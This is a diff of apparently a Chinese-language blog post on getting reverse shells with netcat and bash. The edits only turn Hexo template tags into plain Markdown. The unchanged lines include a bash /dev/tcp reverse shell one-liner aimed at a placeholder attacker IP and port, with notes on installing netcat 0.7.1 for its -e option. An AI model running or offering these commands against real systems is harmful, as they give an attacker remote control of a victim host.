@@ -24,7 +24,7 @@ cover: https://pic.imgdb.cn/item/647c13aaf024cca173275063.png
 
 ## nc 反弹 shell
 
-nc 是 {% label Netcat blue %}的缩写，现目前各大 Linux 系统都默认安装有阉割版本的 Netcat 工具，出于安全考虑取消了 `-e` 参数，因此如果要使用 nc 来反弹 shell 还需要安装 `0.7.1` 版本的 nc 工具。
+nc 是 `Netcat` 的缩写，现目前各大 Linux 系统都默认安装有阉割版本的 Netcat 工具，出于安全考虑取消了 `-e` 参数，因此如果要使用 nc 来反弹 shell 还需要安装 `0.7.1` 版本的 nc 工具。
 
 ### netcat-0.7.1 安装步骤
 
@@ -50,11 +50,9 @@ export NETCAT_HOME=/usr/local/netcat-0.7.1
 export PATH=$PATH:$NETCAT_HOME/bin
 ```
 
-{% hideToggle 注释,orange, %}
+{% hideToggle 注释 %}
 
-1. 用形象但不完全准确地话来描述 Linux 安装软件时的相关命令。
-
-{% blockquote 未知 https://www.sudytech.com/_s80/_t690/2018/0729/c3276a26052/page.psp %}
+用形象但不完全准确地话来描述 Linux 安装软件时的相关命令。
 
 - `./configure` : 就是设计部出了一张设计稿，根据客户需要，符合各种要求。
 - `make` : 就是前端组做好了模板。
@@ -64,9 +62,7 @@ export PATH=$PATH:$NETCAT_HOME/bin
 - `make veryclean` : veryclean 是有多 clean？其实和 distclean 一样 clean。
 - `make uninstall` : 虽然不是每个 sourcecode 包都有这个功能，但是这个东西确实是挺好的。想想看当你一时脑热直接 `./configure` 、`make` 、`make install` 之后，都不知道程序装去哪儿了，这时候就可以用这个进行卸载（当然 `uninstall` 只能执行1次，并且 sourcecode 目录中要有当前安装对应的 Makefile）。
 
-{% endblockquote %}
-
-2. 关于 Linux 环境变量的设置，可以参考这篇 [文章](https://blog.csdn.net/Solomon1558/article/details/51763751) 。
+关于 Linux 环境变量的设置，可以参考这篇 [文章](https://blog.csdn.net/Solomon1558/article/details/51763751) 。
 
 {% endhideToggle %}
 
@@ -110,11 +106,11 @@ exec 5<>/dev/tcp/[LHostIP]/[Port];cat <&5 | while read line; do $line 2>&5 >&5; 
 | `/dev/tcp/[LHostIP]/[Port]` | 让靶机向攻击机建立 TCP 连接 |
 | `0>&1` | 将标准输入与标准输出内容相结合，然后重定向给标准输出 |
 
-{% blockquote myles007  https://www.anquanke.com/post/id/87017 %}
-其实以上bash反弹一句完整的解读过程就是：
 
-bash 产生了一个交互环境与本地主机主动发起与目标主机 `[Port]` 端口建立的连接（即 `TCP [Port]` 会话连接）相结合，然后在重定向个 `tcp [Port]` 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。
-{% endblockquote %}
+>其实以上bash反弹一句完整的解读过程就是：
+>
+>bash 产生了一个交互环境与本地主机主动发起与目标主机 `[Port]` 端口建立的连接（即 `TCP [Port]` 会话连接）相结合，然后在重定向个 `tcp [Port]` 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。
+
 
 第二条命令解释如下：
 
